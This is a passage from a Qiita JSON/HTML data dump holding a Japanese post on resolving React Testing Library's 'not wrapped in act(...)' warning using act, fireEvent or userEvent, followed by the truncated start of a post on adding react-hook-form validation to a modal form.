class=\"dl\">\"</span><span class=\"s2\">new-record-button</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n    <span class=\"c1\">// 登録ボタンクリック</span>\n<span class=\"hdl\"><span class=\"o\">- </span>   <span class=\"nx\">newRecordButton</span><span class=\"p\">.</span><span class=\"nf\">click</span><span class=\"p\">();</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span>   <span class=\"nf\">act</span><span class=\"p\">(()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span>     <span class=\"nx\">newRecordButton</span><span class=\"p\">.</span><span class=\"nf\">click</span><span class=\"p\">();</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span>   <span class=\"p\">});</span>\n</span>  <span class=\"p\">});</span>\n<span class=\"p\">});</span>\n</code></pre></div>\n</div>\n<h3 data-sourcepos=\"64:1-64:26\">\n<span id=\"2fireeventを使う\" class=\"fragment\"></span><a href=\"#2fireevent%E3%82%92%E4%BD%BF%E3%81%86\"><i class=\"fa fa-link\"></i></a>2.<code>fireEvent</code>を使う</h3>\n<p data-sourcepos=\"66:1-66:73\"><iframe id=\"qiita-embed-content__0bdf979a23c658baf64f2a5c48dfd6f2\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__0bdf979a23c658baf64f2a5c48dfd6f2\" data-content=\"https%3A%2F%2Ftesting-library.com%2Fdocs%2Freact-testing-library%2Fcheatsheet%2F%23events\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"68:1-68:90\">fireEventについてドキュメントを確認すると以下の記述がありました</p>\n<blockquote data-sourcepos=\"69:1-70:221\">\n<p data-sourcepos=\"69:2-69:155\">act wrapper around react act; React Testing Library wraps render and fireEvent in a call to act already so most cases should not require using it manually</p>\n<blockquote data-sourcepos=\"70:2-70:221\">\n<p data-sourcepos=\"70:3-70:221\">日本語訳：リアクト・テスティング・ライブラリは、renderとfireEventをすでにactの呼び出しでラップしているので、ほとんどの場合、手動で使う必要はないはずだ。</p>\n</blockquote>\n</blockquote>\n<p data-sourcepos=\"72:1-73:105\">fireEventを使用する場合、内部でactを使用しているため、actを使う必要がないと理解しました。<br>\nfireEventを使用した場合もエラーとならずテスト実行をすることができました。</p>\n<div class=\"code-frame\" data-lang=\"diff_tsx\" data-sourcepos=\"75:1-91:3\">\n<div class=\"code-lang\"><span class=\"bold\">AppComponetnt.spec.tsx</span></div>\n<div class=\"highlight\"><pre><code><span class=\"k\">import</span> <span class=\"nx\">App</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">../App</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">fireEvent</span><span class=\"p\">,</span> <span class=\"nx\">render</span><span class=\"p\">,</span> <span class=\"nx\">screen</span><span class=\"p\">,</span> <span class=\"nx\">act</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">@testing-library/react</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n\n<span class=\"nf\">describe</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">title</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n  <span class=\"nf\">it</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">登録ができる</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"k\">async </span><span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n    <span class=\"nf\">render</span><span class=\"p\">(&lt;</span><span class=\"nc\">App</span> <span class=\"p\">/&gt;);</span>\n    <span class=\"c1\">// 登録ボタンの要素を見つける</span>\n    <span class=\"kd\">const</span> <span class=\"nx\">newRecordButton</span> <span class=\"o\">=</span> <span class=\"k\">await</span> <span class=\"nx\">screen</span><span class=\"p\">.</span><span class=\"nf\">findByTestId</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">new-record-button</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n    <span class=\"c1\">// 登録ボタンクリック</span>\n<span class=\"hdl\"><span class=\"o\">- </span>   <span class=\"nf\">act</span><span class=\"p\">(()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n</span><span class=\"hdl\"><span class=\"o\">- </span>    <span class=\"nx\">newRecordButton</span><span class=\"p\">.</span><span class=\"nf\">click</span><span class=\"p\">();</span>\n</span>      <span class=\"nx\">fireEvent</span><span class=\"p\">.</span><span class=\"nf\">click</span><span class=\"p\">(</span><span class=\"nx\">newRecordButton</span><span class=\"p\">);</span>\n<span class=\"hdl\"><span class=\"o\">- </span>   <span class=\"p\">});</span>\n</span>  <span class=\"p\">});</span>\n<span class=\"p\">});</span>\n</code></pre></div>\n</div>\n<h3 data-sourcepos=\"93:1-93:26\">\n<span id=\"3usereventを使う\" class=\"fragment\"></span><a href=\"#3userevent%E3%82%92%E4%BD%BF%E3%81%86\"><i class=\"fa fa-link\"></i></a>3.<code>userEvent</code>を使う</h3>\n<p data-sourcepos=\"95:1-95:50\"><iframe id=\"qiita-embed-content__89febe93ec1ae041388f57dd789cef65\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__89febe93ec1ae041388f57dd789cef65\" data-content=\"https%3A%2F%2Ftesting-library.com%2Fdocs%2Fuser-event%2Fintro%2F\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<blockquote data-sourcepos=\"97:1-100:130\">\n<p data-sourcepos=\"97:2-98:79\">user-event allows you to describe a user interaction instead of a concrete event. It adds visibility and interactability checks along the way and manipulates the DOM just like a user interaction in the browser would. It factors in that the browser e.g. wouldn't let a user click a hidden element or type in a disabled text box.<br>\nThis is why you should use user-event to test interaction with your components.</p>\n<blockquote data-sourcepos=\"99:2-100:130\">\n<p data-sourcepos=\"99:3-100:130\">日本語訳：user-eventは、具体的なイベントの代わりにユーザーとのインタラクションを記述することができます。その過程で可視性とインタラクタビリティのチェックを追加し、ブラウザでのユーザーインタラクションのようにDOMを操作します。ブラウザは、例えば、ユーザーが非表示の要素をクリックしたり、無効化されたテキストボックスに入力したりすることを許しません。<br>\nこれが、コンポーネントとのインタラクションをテストするためにuser-eventを使うべき理由です。</p>\n</blockquote>\n</blockquote>\n<p data-sourcepos=\"102:1-102:105\">fireEventよりもよりユーザーの操作に近いテストを実現できると理解しました。</p>\n<div class=\"code-frame\" data-lang=\"diff_tsx\" data-sourcepos=\"103:1-118:3\">\n<div class=\"code-lang\"><span class=\"bold\">AppComponetnt.spec.tsx</span></div>\n<div class=\"highlight\"><pre><code><span class=\"k\">import</span> <span class=\"nx\">App</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">../App</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">fireEvent</span><span class=\"p\">,</span> <span class=\"nx\">render</span><span class=\"p\">,</span> <span class=\"nx\">screen</span><span class=\"p\">,</span> <span class=\"nx\">act</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">@testing-library/react</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n\n<span class=\"nf\">describe</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">title</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n  <span class=\"nf\">it</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">登録ができる</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"k\">async </span><span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n<span class=\"hil\"><span class=\"o\">+ </span>  <span class=\"kd\">const</span> <span class=\"nx\">user</span> <span class=\"o\">=</span> <span class=\"nx\">userEvent</span><span class=\"p\">.</span><span class=\"nf\">setup</span><span class=\"p\">();</span>\n</span>    <span class=\"nf\">render</span><span class=\"p\">(&lt;</span><span class=\"nc\">App</span> <span class=\"p\">/&gt;);</span>\n    <span class=\"c1\">// 登録ボタンの要素を見つける</span>\n    <span class=\"kd\">const</span> <span class=\"nx\">newRecordButton</span> <span class=\"o\">=</span> <span class=\"k\">await</span> <span class=\"nx\">screen</span><span class=\"p\">.</span><span class=\"nf\">findByTestId</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">new-record-button</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n    <span class=\"c1\">// 登録ボタンクリック</span>\n<span class=\"hdl\"><span class=\"o\">- </span>  <span class=\"nx\">fireEvent</span><span class=\"p\">.</span><span class=\"nf\">click</span><span class=\"p\">(</span><span class=\"nx\">newRecordButton</span><span class=\"p\">);</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span>  <span class=\"nx\">user</span><span class=\"p\">.</span><span class=\"nf\">click</span><span class=\"p\">(</span><span class=\"nx\">newRecordButton</span><span class=\"p\">);</span>\n</span>  <span class=\"p\">});</span>\n<span class=\"p\">});</span>\n</code></pre></div>\n</div>\n<h1 data-sourcepos=\"121:1-121:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"122:1-123:128\">actでラップしてくださいのエラーから、芋づる式で様々な解消方法が判明したことは何気に嬉しいです。<br>\nドキュメントによると実際のユーザー操作に近い<code>userEvent</code>を使用することを推奨していました。</p>\n<h1 data-sourcepos=\"126:1-126:8\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h1>\n<p data-sourcepos=\"127:1-127:40\"><iframe id=\"qiita-embed-content__8e55bd942cea2d04e8fe050c71b28b7c\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__8e55bd942cea2d04e8fe050c71b28b7c\" data-content=\"https%3A%2F%2Fja.react.dev%2Freference%2Freact%2Fact\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"129:1-129:73\"><iframe id=\"qiita-embed-content__ea846d1bf22db01c3a30d0cc2bfa88a0\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__ea846d1bf22db01c3a30d0cc2bfa88a0\" data-content=\"https%3A%2F%2Ftesting-library.com%2Fdocs%2Freact-testing-library%2Fcheatsheet%2F%23events\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"131:1-131:50\"><iframe id=\"qiita-embed-content__19287fefabb28a5b8e189b9043773612\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__19287fefabb28a5b8e189b9043773612\" data-content=\"https%3A%2F%2Ftesting-library.com%2Fdocs%2Fuser-event%2Fintro%2F\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\njest + react-testing-libraryでのテストを実行中、表題のエラーが発生しました。\n\n# 問題\n### ボタンをクリックするイベントをテスト実行すると表題のエラーになる。\n\n`An update to App inside a test was not wrapped in act(...).`\n日本語訳：`テスト内のAppの更新がact(...)でラップされていなかった。`\n\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/2aed0cd8-033f-4eaa-ad0b-30e2ee107ae9.png)\n\n\n**問題が発生したコード**\n\n```tsx:AppComponetnt.spec.tsx\nimport App from \"../App\";\nimport { render, screen } from \"@testing-library/react\";\n\ndescribe(\"title\", () => {\n  it(\"登録ができる\", async () => {\n    render(<App />);\n    // 登録ボタンの要素を見つける\n    const newRecordButton = await screen.findByTestId(\"new-record-button\");\n    // 登録ボタンクリック\n    newRecordButton.click();\n  });\n});\n\n```\n\n# 解決方法\n\n### 1.`act`を使う\n\nhttps://ja.react.dev/reference/react/act\n\n**ドキュメントより引用**\n>UI テストを書く際、レンダー、ユーザイベント、データフェッチなどのタスクは、ユーザインターフェースにおける「操作単位 (unit of interaction)」と捉えることができます。React は act() というヘルパを提供しており、これによりこれらの「操作単位」に関連するすべての更新が処理されて DOM に適用された後に、アサーションを行えるようになります。\n\n* ボタンをクリックすると、Reactは状態の更新を検知し、再レンダリングが行われます\n* act() を使わない場合、再レンダリングを行っている際に次のプロセスに進もうとし、エラーになってしまいます\n* act() を使うことで、操作単位（今回の場合は、ボタンをクリックする操作）を行った後、次のプロセスに進むことができます\n\n```diff_tsx:AppComponetnt.spec.tsx\nimport App from \"../App\";\n-import { render, screen } from \"@testing-library/react\";\n+import { fireEvent, render, screen, act } from \"@testing-library/react\";\n\ndescribe(\"title\", () => {\n  it(\"登録ができる\", async () => {\n    render(<App />);\n    // 登録ボタンの要素を見つける\n    const newRecordButton = await screen.findByTestId(\"new-record-button\");\n    // 登録ボタンクリック\n-    newRecordButton.click();\n+    act(() => {\n+      newRecordButton.click();\n+    });\n  });\n});\n```\n\n### 2.`fireEvent`を使う\n\nhttps://testing-library.com/docs/react-testing-library/cheatsheet/#events\n\nfireEventについてドキュメントを確認すると以下の記述がありました\n>act wrapper around react act; React Testing Library wraps render and fireEvent in a call to act already so most cases should not require using it manually\n>>日本語訳：リアクト・テスティング・ライブラリは、renderとfireEventをすでにactの呼び出しでラップしているので、ほとんどの場合、手動で使う必要はないはずだ。\n\nfireEventを使用する場合、内部でactを使用しているため、actを使う必要がないと理解しました。\nfireEventを使用した場合もエラーとならずテスト実行をすることができました。\n\n```diff_tsx:AppComponetnt.spec.tsx\nimport App from \"../App\";\nimport { fireEvent, render, screen, act } from \"@testing-library/react\";\n\ndescribe(\"title\", () => {\n  it(\"登録ができる\", async () => {\n    render(<App />);\n    // 登録ボタンの要素を見つける\n    const newRecordButton = await screen.findByTestId(\"new-record-button\");\n    // 登録ボタンクリック\n-    act(() => {\n-     newRecordButton.click();\n      fireEvent.click(newRecordButton);\n-    });\n  });\n});\n```\n\n### 3.`userEvent`を使う\n\nhttps://testing-library.com/docs/user-event/intro/\n\n>user-event allows you to describe a user interaction instead of a concrete event. It adds visibility and interactability checks along the way and manipulates the DOM just like a user interaction in the browser would. It factors in that the browser e.g. wouldn't let a user click a hidden element or type in a disabled text box.\nThis is why you should use user-event to test interaction with your components.\n>>日本語訳：user-eventは、具体的なイベントの代わりにユーザーとのインタラクションを記述することができます。その過程で可視性とインタラクタビリティのチェックを追加し、ブラウザでのユーザーインタラクションのようにDOMを操作します。ブラウザは、例えば、ユーザーが非表示の要素をクリックしたり、無効化されたテキストボックスに入力したりすることを許しません。\nこれが、コンポーネントとのインタラクションをテストするためにuser-eventを使うべき理由です。\n\nfireEventよりもよりユーザーの操作に近いテストを実現できると理解しました。\n```diff_tsx:AppComponetnt.spec.tsx\nimport App from \"../App\";\nimport { fireEvent, render, screen, act } from \"@testing-library/react\";\n\ndescribe(\"title\", () => {\n  it(\"登録ができる\", async () => {\n+   const user = userEvent.setup();\n    render(<App />);\n    // 登録ボタンの要素を見つける\n    const newRecordButton = await screen.findByTestId(\"new-record-button\");\n    // 登録ボタンクリック\n-   fireEvent.click(newRecordButton);\n+   user.click(newRecordButton);\n  });\n});\n```\n\n\n# おわりに\nactでラップしてくださいのエラーから、芋づる式で様々な解消方法が判明したことは何気に嬉しいです。\nドキュメントによると実際のユーザー操作に近い`userEvent`を使用することを推奨していました。\n\n\n# 参考\nhttps://ja.react.dev/reference/react/act\n\nhttps://testing-library.com/docs/react-testing-library/cheatsheet/#events\n\nhttps://testing-library.com/docs/user-event/intro/\n","coediting":false,"comments_count":0,"created_at":"2025-04-16T22:42:16+09:00","group":null,"id":"2e2dd6a19f860d154b8c","likes_count":1,"private":false,"reactions_count":0,"stocks_count":1,"tags":[{"name":"React","versions":[]},{"name":"react-testing-library","versions":[]}],"title":"react-testing-libraryで『An update to App inside a test was not wrapped in act(...).』エラー","updated_at":"2025-04-16T22:42:16+09:00","url":"https://qiita.com/asa129/items/2e2dd6a19f860d154b8c","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":587,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-2:246\">現在取り組んでいる、学習記録アプリのリニューアル作業にて登録フォームのバリデーションにreact-hook-formを導入することにしました。学んだことを備忘録としてまとめてみました。</p>\n<h2 data-sourcepos=\"4:1-4:24\">\n<span id=\"実現したいこと\" class=\"fragment\"></span><a href=\"#%E5%AE%9F%E7%8F%BE%E3%81%97%E3%81%9F%E3%81%84%E3%81%93%E3%81%A8\"><i class=\"fa fa-link\"></i></a>実現したいこと</h2>\n<p data-sourcepos=\"5:1-5:96\">フォームの登録ボタンを押したときに、バリデーションを適用させたい</p>\n<p data-sourcepos=\"7:1-7:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F51eae118-f89c-40a4-b15b-8dce78b4d881.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=4daa0b23bf2aabeb100097e2e887a586\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F51eae118-f89c-40a4-b15b-8dce78b4d881.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=4daa0b23bf2aabeb100097e2e887a586\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F51eae118-f89c-40a4-b15b-8dce78b4d881.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=837714460fa35ed79c7304c5ba5a9a7d 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/51eae118-f89c-40a4-b15b-8dce78b4d881.png\" loading=\"lazy\"></a></p>\n<h1 data-sourcepos=\"10:1-10:26\">\n<span id=\"react-hook-formとは\" class=\"fragment\"></span><a href=\"#react-hook-form%E3%81%A8%E3%81%AF\"><i class=\"fa fa-link\"></i></a>react-hook-formとは？</h1>\n<p data-sourcepos=\"11:1-11:28\"><iframe id=\"qiita-embed-content__1a75f08fa0afb8e9839d8d628e39a44f\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__1a75f08fa0afb8e9839d8d628e39a44f\" data-content=\"https%3A%2F%2Freact-hook-form.com%2F\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"13:1-13:46\"><strong>TOPページより引用（日本語訳）</strong></p>\n<blockquote data-sourcepos=\"14:1-15:132\">\n<p data-sourcepos=\"14:2-15:132\">\"Performant, flexible and extensible forms with easy-to-use validation.\"<br>\n（高性能で柔軟性があり拡張可能なフォームで、使いやすいバリデーション機能を備えています）</p>\n</blockquote>\n<p data-sourcepos=\"17:1-17:105\">Reactで<strong>フォームを取り扱う際に使える高性能なライブラリ</strong>と理解しました。</p>\n<h1 data-sourcepos=\"19:1-19:14\">\n<span id=\"導入手順\" class=\"fragment\"></span><a href=\"#%E5%B0%8E%E5%85%A5%E6%89%8B%E9%A0%86\"><i class=\"fa fa-link\"></i></a>導入手順</h1>\n<h2 data-sourcepos=\"20:1-20:50\">\n<span id=\"1react-hook-formのドキュメントを確認\" class=\"fragment\"></span><a href=\"#1react-hook-form%E3%81%AE%E3%83%89%E3%82%AD%E3%83%A5%E3%83%A1%E3%83%B3%E3%83%88%E3%82%92%E7%A2%BA%E8%AA%8D\"><i class=\"fa fa-link\"></i></a>1.react-hook-formのドキュメントを確認</h2>\n<p data-sourcepos=\"21:1-21:50\"><iframe id=\"qiita-embed-content__b425bf303099eb010fa0045448255be5\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__b425bf303099eb010fa0045448255be5\" data-content=\"https%3A%2F%2Freact-hook-form.com%2Fget-started%23Quickstart\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h2 data-sourcepos=\"23:1-23:41\">\n<span id=\"2ライブラリをインストール\" class=\"fragment\"></span><a href=\"#2%E3%83%A9%E3%82%A4%E3%83%96%E3%83%A9%E3%83%AA%E3%82%92%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AB\"><i class=\"fa fa-link\"></i></a>2.ライブラリをインストール</h2>\n<div class=\"code-frame\" data-lang=\"shell\" data-sourcepos=\"24:1-26:3\"><div class=\"highlight\"><pre><code><span class=\"nv\">$ </span>npm <span class=\"nb\">install </span>react-hook-form\n</code></pre></div></div>\n<h2 data-sourcepos=\"28:1-28:35\">\n<span id=\"3quick-startのexampleを確認\" class=\"fragment\"></span><a href=\"#3quick-start%E3%81%AEexample%E3%82%92%E7%A2%BA%E8%AA%8D\"><i class=\"fa fa-link\"></i></a>3.Quick StartのExampleを確認</h2>\n<p data-sourcepos=\"29:1-29:52\"><strong>react-hook-formのドキュメントより引用</strong></p>\n<blockquote data-sourcepos=\"30:1-30:124\">\n<p data-sourcepos=\"30:3-30:124\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F38fc1a26-ac64-4e87-9841-5a9628fc9858.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=9139a13eb7f81f25d5f370513cdb9b5d\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F38fc1a26-ac64-4e87-9841-5a9628fc9858.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=9139a13eb7f81f25d5f370513cdb9b5d\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F38fc1a26-ac64-4e87-9841-5a9628fc9858.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=7dd87efb91255c16d810944593246dd9 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/38fc1a26-ac64-4e87-9841-5a9628fc9858.png\" loading=\"lazy\"></a></p>\n</blockquote>\n<h2 data-sourcepos=\"32:1-32:24\">\n<span id=\"4form形式へ変更\" class=\"fragment\"></span><a href=\"#4form%E5%BD%A2%E5%BC%8F%E3%81%B8%E5%A4%89%E6%9B%B4\"><i class=\"fa fa-link\"></i></a>4.form形式へ変更</h2>\n<p data-sourcepos=\"33:1-34:138\">クイックスタートを確認すると、formタグを使用した構造を元に使用例が提示されていました。<br>\n私は各入力値を、useStateで設定するように実装していたため、form形式に変更することから始めました。</p>\n<p data-sourcepos=\"36:1-36:26\"><strong>formの形式に修正</strong></p>\n<div class=\"code-frame\" data-lang=\"diff_tsx\" data-sourcepos=\"38:1-84:3\">\n<div class=\"code-lang\"><span class=\"bold\">App.tsx</span></div>\n<div class=\"highlight\"><pre><code><span class=\"p\">&lt;</span><span class=\"nc\">Modal</span> <span class=\"na\">initialFocusRef</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"nx\">initialRef</span><span class=\"si\">}</span> <span class=\"na\">isOpen</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"nx\">isOpen</span><span class=\"si\">}</span> <span class=\"na\">onClose</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"nx\">onClose</span><span class=\"si\">}</span><span class=\"p\">&gt;</span>\n            <span class=\"p\">&lt;</span><span class=\"nc\">ModalOverlay</span> <span class=\"p\">/&gt;</span>\n            <span class=\"p\">&lt;</span><span class=\"nc\">ModalContent</span><span class=\"p\">&gt;</span>\n<span class=\"hil\">+              <span class=\"p\">&lt;</span><span class=\"nt\">form</span> <span class=\"na\">onSubmit</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"nf\">handleSubmit</span><span class=\"p\">(</span><span class=\"nx\">onRecordRegist</span><span class=\"p\">)</span><span class=\"si\">}</span><span class=\"p\">&gt;</span>\n</span>                <span class=\"p\">&lt;</span><span class=\"nc\">ModalHeader</span><span class=\"p\">&gt;</span>Modal Title<span class=\"p\">&lt;/</span><span class=\"nc\">ModalHeader</span><span class=\"p\">&gt;</span>\n                <span class=\"p\">&lt;</span><span class=\"nc\">ModalCloseButton</span> <span class=\"p\">/&gt;</span>\n                <span class=\"p\">&lt;</span><span class=\"nc\">ModalBody</span><span class=\"p\">&gt;</span>\n                  <span class=\"p\">&lt;</span><span class=\"nc\">FormControl</span> <span class=\"na\">isRequired</span><span class=\"p\">&gt;</span>\n                    <span class=\"p\">&lt;</span><span class=\"nc\">FormLabel</span><span class=\"p\">&gt;</span>学習内容<span class=\"p\">&lt;/</span><span class=\"nc\">FormLabel</span><span class=\"p\">&gt;</span>\n                    <span class=\"p\">&lt;</span><span class=\"nc\">Input</span>\n                      <span class=\"na\">ref</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"nx\">initialRef</span><span class=\"si\">}</span>\n                      <span class=\"na\">placeholder</span><span class=\"p\">=</span><span class=\"s\">\"学習内容\"</span>\n                      <span class=\"na\">onChange</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"p\">(</span><span class=\"nx\">e</span><span class=\"p\">:</span> <span class=\"nx\">ChangeEvent</span><span class=\"o\">&lt;</span><span class=\"nx\">HTMLInputElement</span><span class=\"o\">&gt;</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span>\n                        <span class=\"nf\">setTitle</span><span class=\"p\">(</span><span class=\"nx\">e</span><span class=\"p\">.</span><span class=\"nx\">target</span><span class=\"p\">.</span><span class=\"nx\">value</span><span class=\"p\">)</span> <span class=\"c1\">// useStateを使い学習内容をセット</span>\n                      <span class=\"si\">}</span>\n                    <span class=\"p\">/&gt;</span>\n                  <span class=\"p\">&lt;/</span><span class=\"nc\">FormControl</span><span class=\"p\">&gt;</span>\n                  <span class=\"p\">&lt;</span><span class=\"nc\">FormControl</span> <span class=\"na\">isRequired</span><span class=\"p\">&gt;</span>\n                    <span class=\"p\">&lt;</span><span class=\"nc\">FormLabel</span><span class=\"p\">&gt;</span>学習時間<span class=\"p\">&lt;/</span><span class=\"nc\">FormLabel</span><span class=\"p\">&gt;</span>\n                    <span class=\"p\">&lt;</span><span class=\"nc\">NumberInput</span>\n                      <span class=\"na\">defaultValue</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"mi\">0</span><span class=\"si\">}</span>\n                      <span class=\"na\">max</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"mi\">50</span><span class=\"si\">}</span>\n                      <span class=\"na\">min</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"mi\">0</span><span class=\"si\">}</span>\n                      <span class=\"na\">onChange</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"p\">(</span><span class=\"nx\">_</span><span class=\"p\">,</span> <span class=\"nx\">valueAsNumber</span><span class=\"p\">:</span> <span class=\"kr\">number</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span>\n                        <span class=\"nf\">setTime</span><span class=\"p\">(</span><span class=\"nx\">valueAsNumber</span><span class=\"p\">)</span> <span class=\"c1\">// useStateを使い学習時間をセット</span>\n                      <span class=\"si\">}</span>\n                    <span class=\"p\">&gt;</span>\n                      <span class=\"p\">&lt;</span><span class=\"nc\">NumberInputField</span> <span class=\"p\">/&gt;</span>\n                      <span class=\"p\">&lt;</span><span class=\"nc\">NumberInputStepper</span><span class=\"p\">&gt;</span>\n                        <span class=\"p\">&lt;</span><span class=\"nc\">NumberIncrementStepper</span> <span class=\"p\">/&gt;</span>\n                        <span class=\"p\">&lt;</span><span class=\"nc\">NumberDecrementStepper</span> <span class=\"p\">/&gt;</span>\n                      <span class=\"p\">&lt;/</span><span class=\"nc\">NumberInputStepper</span><span class=\"p\">&gt;</span>\n                    <span class=\"p\">&lt;/</span><span class=\"nc\">NumberInput</span><span class=\"p\">&gt;</span>\n                  <span class=\"p\">&lt;/</span><span class=\"nc\">FormControl</span><span class=\"p\">&gt;</span>\n                <span class=\"p\">&lt;/</span><span class=\"nc\">ModalBody</span><span class=\"p\">&gt;</span>\n\n                <span class=\"p\">&lt;</span><span 